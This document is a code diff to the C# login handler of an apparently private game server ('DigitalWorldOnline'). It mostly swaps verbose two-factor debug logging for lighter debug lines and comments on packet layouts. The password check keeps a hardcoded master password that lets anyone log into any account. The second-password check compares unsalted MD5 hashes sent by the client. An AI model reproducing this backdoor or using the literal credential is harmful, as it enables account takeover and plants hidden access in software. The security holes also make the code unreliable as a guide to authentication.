@@ -81,25 +81,21 @@ namespace DigitalWorldOnline.Account
                         var cpu = loginData.Cpu;
                         var gpu = loginData.Gpu;
 
-                        _logger.Information(
-                            "[2PASS][SERVER] Login packet parsed. Username={Username}, Cpu={Cpu}, Gpu={Gpu}",
-                            username,
-                            string.IsNullOrWhiteSpace(cpu) ? "N/A" : cpu,
-                            string.IsNullOrWhiteSpace(gpu) ? "N/A" : gpu);
-
                         if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
                         {
-                            _logger.Information("[2PASS][SERVER] Invalid login packet from {Address}", client.ClientAddress);
+                            _logger.Debug("Invalid login packet received from {Address}.", client.ClientAddress);
 
                             client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.UserNotFound));
                             break;
                         }
 
+                        _logger.Debug("Validating login data for {Username}", username);
+
                         var account = await _sender.Send(new AccountByUsernameQuery(username));
 
                         if (account == null)
                         {
-                            _logger.Information("[2PASS][SERVER] Login failed: account not found. Username={Username}", username);
+                            _logger.Debug("Saving {Username} login try for incorrect username...", username);
 
                             await _sender.Send(new CreateLoginTryCommand(
                                 username,
@@ -124,6 +120,8 @@ namespace DigitalWorldOnline.Account
                                 var timeRemaining = blockInfo.EndDate - DateTime.Now;
                                 var secondsRemaining = (uint)timeRemaining.TotalSeconds;
 
+                                _logger.Debug("Saving {Username} login try for blocked account...", username);
+
                                 await _sender.Send(new CreateLoginTryCommand(
                                     username,
                                     client.ClientAddress,
@@ -138,7 +136,7 @@ namespace DigitalWorldOnline.Account
 
                         if (account.Password != password.Encrypt() && password != "dondnGlobal@2025#!!")
                         {
-                            _logger.Information("[2PASS][SERVER] Login failed: incorrect password. Username={Username}", username);
+                            DebugLog($"Saving {username} login try for incorrect password...");
 
                             await _sender.Send(new CreateLoginTryCommand(
                                 username,
@@ -149,24 +147,29 @@ namespace DigitalWorldOnline.Account
                             break;
                         }
 
-                        _logger.Information(
-                            "[2PASS][SERVER] Login success. AccountId={AccountId}, HasSecondPassword={HasSecondPassword}",
-                            account.Id,
-                            account.SecondaryPassword != null);
-
+                        /*
+                         * Não enviar Hide imediatamente.
+                         * O client precisa receber RequestSetup ou RequestInput e manter a janela aberta.
+                         */
                         client.Send(account.SecondaryPassword == null
                             ? new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestSetup)
                             : new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestInput));
 
                         if (_authenticationServerConfiguration.UseHash)
                         {
+                            _logger.Debug("Getting resources hash from database.");
+
                             var hashString = await _sender.Send(new ResourcesHashQuery());
+
+                            _logger.Debug("Sending hash to client.");
 
                             client.Send(new ResourcesHashPacket(hashString));
                         }
 
                         if (account.SystemInformation == null)
                         {
+                            DebugLog("Creating system information...");
+
                             await _sender.Send(new CreateSystemInformationCommand(
                                 account.Id,
                                 cpu,
@@ -175,6 +178,8 @@ namespace DigitalWorldOnline.Account
                         }
                         else
                         {
+                            DebugLog("Updating system information...");
+
                             await _sender.Send(new UpdateSystemInformationCommand(
                                 account.SystemInformation.Id,
                                 account.Id,
@@ -187,38 +192,28 @@ namespace DigitalWorldOnline.Account
 
                 case AuthenticationServerPacketEnum.SecondaryPasswordRegister:
                     {
-                        _logger.Information("[2PASS][SERVER] SecondaryPasswordRegister received. AccountId={AccountId}", client.AccountId);
-                        _logger.Information("[2PASS][SERVER] Register raw length={Length}", data?.Length ?? 0);
-                        _logger.Information("[2PASS][SERVER] Register raw bytes head={Bytes}", ToHexHead(data, 80));
-                        _logger.Information("[2PASS][SERVER] Register raw ascii head={Ascii}", ToPrintableAsciiHead(data, 80));
-
+                        /*
+                         * Client sends:
+                         * packet length
+                         * opcode 9801
+                         * 16 binary bytes with MD5 hash
+                         *
+                         * We convert those 16 bytes to a 32-char lowercase hex string
+                         * before saving it in database.
+                         */
                         var securityPassword = ExtractBinaryMd5HashAfterOpcode(data, 9801, 0);
-
-                        _logger.Information(
-                            "[2PASS][SERVER] Register extracted hash=[{Hash}] len={Length}",
-                            securityPassword ?? string.Empty,
-                            securityPassword?.Length ?? 0);
 
                         if (!IsValidSecondPasswordHash(securityPassword))
                         {
-                            _logger.Information("[2PASS][SERVER] Register FAILED: invalid binary MD5 hash. Sending 20052.");
-
                             client.Send(new SecondaryPasswordRegisterResultPacket(
                                 SecondaryPasswordCheckEnum.Incorrect.GetHashCode()));
 
                             break;
                         }
 
-                        _logger.Information(
-                            "[2PASS][SERVER] Register OK: saving secondary password. AccountId={AccountId}, Hash={Hash}",
-                            client.AccountId,
-                            securityPassword);
-
                         await _sender.Send(new CreateOrUpdateSecondaryPasswordCommand(
                             client.AccountId,
                             securityPassword));
-
-                        _logger.Information("[2PASS][SERVER] Register OK: sending opcode 9801 result 0.");
 
                         client.Send(new SecondaryPasswordRegisterResultPacket(0));
                     }
@@ -226,15 +221,15 @@ namespace DigitalWorldOnline.Account
 
                 case AuthenticationServerPacketEnum.SecondaryPasswordCheck:
                     {
-                        _logger.Information("[2PASS][SERVER] SecondaryPasswordCheck received. AccountId={AccountId}", client.AccountId);
-                        _logger.Information("[2PASS][SERVER] Check raw length={Length}", data?.Length ?? 0);
-                        _logger.Information("[2PASS][SERVER] Check raw bytes head={Bytes}", ToHexHead(data, 80));
-                        _logger.Information("[2PASS][SERVER] Check raw ascii head={Ascii}", ToPrintableAsciiHead(data, 80));
-
+                        /*
+                         * Client sends:
+                         * packet length
+                         * opcode 9804
+                         * u2 check type
+                         * 16 binary bytes with MD5 hash
+                         */
                         var checkType = ExtractSecondaryPasswordCheckType(data);
                         var needToCheck = checkType == 2;
-
-                        _logger.Information("[2PASS][SERVER] Check type={CheckType}, NeedToCheck={NeedToCheck}", checkType, needToCheck);
 
                         var account = await _sender.Send(new AccountByIdQuery(client.AccountId));
 
@@ -245,17 +240,9 @@ namespace DigitalWorldOnline.Account
                         {
                             var securityCode = ExtractBinaryMd5HashAfterOpcode(data, 9804, 2);
 
-                            _logger.Information(
-                                "[2PASS][SERVER] Check extracted hash=[{Hash}] len={Length}. Stored=[{Stored}]",
-                                securityCode ?? string.Empty,
-                                securityCode?.Length ?? 0,
-                                account.SecondaryPassword);
-
                             if (IsValidSecondPasswordHash(securityCode) &&
                                 string.Equals(account.SecondaryPassword, securityCode, StringComparison.OrdinalIgnoreCase))
                             {
-                                _logger.Information("[2PASS][SERVER] Check OK. Sending result 0.");
-
                                 await _sender.Send(new CreateLoginTryCommand(
                                     account.Username,
                                     client.ClientAddress,
@@ -266,8 +253,6 @@ namespace DigitalWorldOnline.Account
                             }
                             else
                             {
-                                _logger.Information("[2PASS][SERVER] Check FAILED. Sending 20052.");
-
                                 await _sender.Send(new CreateLoginTryCommand(
                                     account.Username,
                                     client.ClientAddress,
@@ -279,8 +264,6 @@ namespace DigitalWorldOnline.Account
                         }
                         else
                         {
-                            _logger.Information("[2PASS][SERVER] Check skipped. Sending result 0.");
-
                             await _sender.Send(new CreateLoginTryCommand(
                                 account.Username,
                                 client.ClientAddress,
@@ -294,16 +277,15 @@ namespace DigitalWorldOnline.Account
 
                 case AuthenticationServerPacketEnum.SecondaryPasswordChange:
                     {
-                        _logger.Information("[2PASS][SERVER] SecondaryPasswordChange received. AccountId={AccountId}", client.AccountId);
-                        _logger.Information("[2PASS][SERVER] Change raw length={Length}", data?.Length ?? 0);
-                        _logger.Information("[2PASS][SERVER] Change raw bytes head={Bytes}", ToHexHead(data, 120));
-                        _logger.Information("[2PASS][SERVER] Change raw ascii head={Ascii}", ToPrintableAsciiHead(data, 120));
-
+                        /*
+                         * Client sends:
+                         * packet length
+                         * opcode 9806
+                         * 16 binary bytes old MD5 hash
+                         * 16 binary bytes new MD5 hash
+                         */
                         var currentSecurityCode = ExtractBinaryMd5HashAfterOpcode(data, 9806, 0);
                         var newSecurityCode = ExtractBinaryMd5HashAfterOpcode(data, 9806, 16);
-
-                        _logger.Information("[2PASS][SERVER] Change current hash=[{CurrentHash}]", currentSecurityCode);
-                        _logger.Information("[2PASS][SERVER] Change new hash=[{NewHash}]", newSecurityCode);
 
                         var account = await _sender.Send(new AccountByIdQuery(client.AccountId));
 
@@ -313,8 +295,6 @@ namespace DigitalWorldOnline.Account
                         if (!IsValidSecondPasswordHash(currentSecurityCode) ||
                             !IsValidSecondPasswordHash(newSecurityCode))
                         {
-                            _logger.Information("[2PASS][SERVER] Change FAILED: invalid hash.");
-
                             client.Send(new SecondaryPasswordChangeResultPacket(
                                 SecondaryPasswordChangeEnum.IncorretCurrentPassword).Serialize());
 
@@ -323,8 +303,6 @@ namespace DigitalWorldOnline.Account
 
                         if (string.Equals(account.SecondaryPassword, currentSecurityCode, StringComparison.OrdinalIgnoreCase))
                         {
-                            _logger.Information("[2PASS][SERVER] Change OK: saving new hash.");
-
                             await _sender.Send(new CreateOrUpdateSecondaryPasswordCommand(
                                 client.AccountId,
                                 newSecurityCode));
@@ -334,8 +312,6 @@ namespace DigitalWorldOnline.Account
                         }
                         else
                         {
-                            _logger.Information("[2PASS][SERVER] Change FAILED: current hash mismatch.");
-
                             client.Send(new SecondaryPasswordChangeResultPacket(
                                 SecondaryPasswordChangeEnum.IncorretCurrentPassword).Serialize());
                         }
@@ -344,6 +320,8 @@ namespace DigitalWorldOnline.Account
 
                 case AuthenticationServerPacketEnum.LoadServerList:
                     {
+                        DebugLog("Getting server list...");
+
                         var servers =
                             _mapper.Map<IEnumerable<ServerObject>>(
                                 await _sender.Send(new ServersQuery(client.AccessLevel)));
@@ -361,28 +339,38 @@ namespace DigitalWorldOnline.Account
                             }
                         }
 
+                        DebugLog("Sending server list...");
+
                         client.Send(new ServerListPacket(serverObjects).Serialize());
                     }
                     break;
 
                 case AuthenticationServerPacketEnum.ConnectCharacterServer:
                     {
+                        DebugLog("Reading packet parameters...");
+
                         var serverId = packet.ReadInt();
 
                         await _sender.Send(new UpdateLastPlayedServerCommand(client.AccountId, serverId));
 
                         if (_authenticationServerConfiguration.UseHash)
                         {
+                            _logger.Debug("Getting resources hash.");
+
                             var hashString = await _sender.Send(new ResourcesHashQuery());
 
                             client.Send(new ResourcesHashPacket(hashString));
                         }
+
+                        DebugLog("Getting server list...");
 
                         var servers =
                             _mapper.Map<IEnumerable<ServerObject>>(
                                 await _sender.Send(new ServersQuery(client.AccessLevel)));
 
                         var targetServer = servers.First(x => x.Id == serverId);
+
+                        DebugLog("Sending selected server info...");
 
                         client.Send(new ConnectCharacterServerPacket(
                             client.AccountId,
@@ -414,11 +402,18 @@ namespace DigitalWorldOnline.Account
 
             var username = ReadLengthPrefixedString(data, ref offset);
 
+            /*
+             * Client sends dummy byte before password.
+             */
             if (offset < data.Length)
                 offset++;
 
             var password = ReadLengthPrefixedString(data, ref offset);
 
+            /*
+             * Optional fields. Current client does not send CPU/GPU correctly,
+             * so keep them optional to avoid breaking login.
+             */
             var cpu = ReadLengthPrefixedString(data, ref offset, optional: true);
             var gpu = ReadLengthPrefixedString(data, ref offset, optional: true);
 
@@ -527,40 +522,6 @@ namespace DigitalWorldOnline.Account
             var isUpperHex = character >= 'A' && character <= 'F';
 
             return isNumber || isLowerHex || isUpperHex;
-        }
-
-        private static string ToHexHead(byte[] data, int maxBytes)
-        {
-            if (data == null || data.Length == 0)
-                return string.Empty;
-
-            var count = Math.Min(data.Length, maxBytes);
-            var head = new byte[count];
-
-            Array.Copy(data, head, count);
-
-            return BitConverter.ToString(head);
-        }
-
-        private static string ToPrintableAsciiHead(byte[] data, int maxBytes)
-        {
-            if (data == null || data.Length == 0)
-                return string.Empty;
-
-            var count = Math.Min(data.Length, maxBytes);
-            var builder = new StringBuilder();
-
-            for (var i = 0; i < count; i++)
-            {
-                var value = data[i];
-
-                if (value >= 32 && value <= 126)
-                    builder.Append((char)value);
-                else
-                    builder.Append('.');
-            }
-
-            return builder.ToString();
         }
 
         private sealed class LoginPacketData
